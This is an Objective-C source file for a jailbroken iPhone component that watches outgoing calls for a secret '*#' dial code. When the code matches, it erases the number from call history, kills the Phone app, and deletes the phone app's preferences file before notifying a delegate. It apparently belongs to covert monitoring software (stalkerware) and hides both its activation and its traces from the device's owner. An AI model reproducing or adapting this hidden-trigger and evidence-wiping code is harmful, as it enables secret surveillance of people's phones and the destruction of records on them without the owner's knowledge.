//
//  ActivationCodeCaptureManager.m
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 11/23/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "ActivationCodeCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"
#import "CallHistoryDAO.h"
#import "NoteACCapture.h"

#import "CTCall.h"


@interface ActivationCodeCaptureManager (private)
- (void) onActivationCodeReceived: (id) aNotification;
- (void) scanAndDeleteActivationCodeFromCallHistory;
- (void) deleteActivationCodeFromCallHistory: (NSString*) aActivationCode;
- (void) deleteActivationCodeFromMobilePhoneCache;

@end

@implementation ActivationCodeCaptureManager

@synthesize mDialNumber;
@synthesize mActivationCodeDialing;

- (id) initWithDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mNoteACCapture = [[NoteACCapture alloc] initWithDelegate:aDelegate];
		mDelegate = aDelegate;
	}
	return (self);
}

- (id) initWithTelephonyNotification: (id <TelephonyNotificationManager>) aManager andDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate {
    self = [super init];
    if (self != nil) {
		mNoteACCapture = [[NoteACCapture alloc] initWithDelegate:aDelegate];
        mTelephonyNotificationManager = aManager;
		mDelegate = aDelegate;
    }
    return self;
}

- (void) startCaptureActivationCode {
	if (!mListening) {
		[self scanAndDeleteActivationCodeFromCallHistory];
		system("killall MobilePhone");
		[mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(onActivationCodeReceived:) forNotification:KCALLSTATUSCHANGENOTIFICATION];
		[mNoteACCapture start];
		mListening = TRUE;
	}
}

- (void) stopCaptureActivationCode {
	[mTelephonyNotificationManager removeListner:self];
	[mNoteACCapture stop];
	mListening = FALSE;
}

- (void) onActivationCodeReceived: (id) aNotification {
	NSNotification* notification = aNotification;
	NSDictionary* dictionary = [notification userInfo];
	if (dictionary) {
		DLog(@"dictionary: %@", dictionary);
		NSInteger callStatus = [[dictionary objectForKey:@"kCTCallStatus"] intValue];
		if (callStatus == CALL_NOTIFICATION_STATUS_OUTGOING) {
			CTCall* call = (CTCall*)[dictionary objectForKey:@"kCTCall"];
			if (call) {
				NSString* dialNumber = CTCallCopyAddress(nil, call);
				if (dialNumber && [dialNumber length] >= 3) {
					DLog(@"dialNumber: %@", dialNumber)
					if ([dialNumber hasPrefix:@"*#"]) {
						NSString* activationCode = [dialNumber substringWithRange:NSMakeRange(2, [dialNumber length] - 2)];
						NSRange starSignRange = [activationCode rangeOfString:@"*"];
						NSRange numberSignRange = [activationCode rangeOfString:@"#"];
						if (numberSignRange.length == 0 && starSignRange.length == 0) {
							DLog(@"Activation code: %@", activationCode)
							[self setMActivationCodeDialing:TRUE];
							[self setMDialNumber:[NSString stringWithString:dialNumber]];
						}
					}
				}
				[dialNumber release];
			}
		} else if (callStatus == CALL_NOTIFICATION_STATUS_TERMINATED) {
			if ([self mActivationCodeDialing]) {
				[self setMActivationCodeDialing:FALSE];
				NSString *ac = [[self mDialNumber] substringWithRange:NSMakeRange(2, [mDialNumber length] - 2)];
				DLog (@"Activation code in phone keypad:%@", ac);
				DLog (@"Activation code :%@", [self mAC]);
				
				if ([[self mAC] isEqualToString:ac]) {				// acitvation code					
					[self deleteActivationCodeFromCallHistory:[self mDialNumber]];
					system("killall MobilePhone");
					[self deleteActivationCodeFromMobilePhoneCache];
					if ([mDelegate respondsToSelector:@selector(activationCodeDidReceived:)]) {
						[mDelegate performSelector:@selector(activationCodeDidReceived:) withObject:self withObject:ac];
					}
				} 
				/*
				else if ([ac isEqualToString:_DEFAULTACTIVATIONCODE_]) {		// default launch code
					[self deleteActivationCodeFromCallHistory:[self mDialNumber]];
					system("killall MobilePhone");
					[self deleteActivationCodeFromMobilePhoneCache];
				}
				*/
				[self setMDialNumber:nil];
			}
		}
	}
}

- (void) scanAndDeleteActivationCodeFromCallHistory {
	CallHistoryDAO* dao = [[CallHistoryDAO alloc] init];
	[dao scanAndDeleteAllActivationCode];
	[dao release];
}

- (void) deleteActivationCodeFromCallHistory: (NSString*) aActivationCode {
	CallHistoryDAO* dao = [[CallHistoryDAO alloc] init];
	[dao deleteActivationCode:aActivationCode];
	[dao release];
}

- (void) deleteActivationCodeFromMobilePhoneCache {
	NSString *cacheFilePath = @"/User/Library/Preferences/com.apple.mobilephone.plist";
	NSFileManager *fm = [NSFileManager defaultManager];
	if (fm && [fm fileExistsAtPath:cacheFilePath]) {
		[fm removeItemAtPath:cacheFilePath error:nil];
	}
}

#pragma mark Overide property
#pragma mark -

- (void) setMAC: (NSString *) aAC {
	[mAC release];
	mAC = [[NSString alloc] initWithString:aAC];
	[mNoteACCapture setMAC:aAC];
}

- (NSString *) mAC {
	return (mAC);
}

- (void) dealloc {
	[mDialNumber release];
	[mAC release];
	[self stopCaptureActivationCode];
	[mTelephonyNotificationManagerImpl release];
	[mNoteACCapture release];
	[super dealloc];
}

@end
